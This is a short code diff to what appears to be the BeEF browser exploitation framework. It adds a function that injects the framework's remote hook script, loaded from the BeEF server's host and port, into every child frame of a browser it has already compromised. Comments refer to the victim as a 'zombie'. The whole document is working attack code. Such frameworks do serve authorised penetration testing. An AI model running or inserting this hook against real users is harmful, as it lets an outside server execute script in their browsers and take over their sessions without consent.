@@ -843,6 +843,30 @@ beef.browser = {
     },
 
     /**
+     * Hooks all child frames in the current window
+     * Restricted by same-origin policy
+     */
+    hookChildFrames:function () {
+
+        // create script object
+        var script  = document.createElement('script');
+        script.type = 'text/javascript';
+        script.src  = '<%== @beef_proto %>://<%== @beef_host %>:<%== @beef_port %><%== @hook_file %>';
+
+        // loop through child frames
+        for (var i=0;i<self.frames.length;i++) {
+            try {
+                // append hook script
+                self.frames[i].document.body.appendChild(script);
+                console.log("Hooked child frame [src:"+self.frames[i].window.location.href+"]");
+            } catch (e) {
+                // warn on cross-domain
+                console.log("Hooking frame failed");
+            }
+        }
+    },
+
+    /**
      * Checks if the zombie has flash installed and enabled.
      * @return: {Boolean} true or false.
      *
